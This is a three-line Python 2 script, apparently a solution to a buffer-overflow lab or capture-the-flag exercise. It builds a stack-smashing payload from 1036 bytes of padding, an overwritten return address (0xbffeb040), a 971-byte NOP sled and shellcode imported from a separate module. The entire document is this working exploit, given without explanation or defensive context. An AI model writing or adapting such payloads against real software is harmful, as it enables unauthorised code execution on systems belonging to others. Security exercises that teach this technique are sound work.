from shellcode import shellcode
from struct import pack

print 'a' *1036 + pack("<I", 0xbffeb040) + "\x90" *971 +shellcode
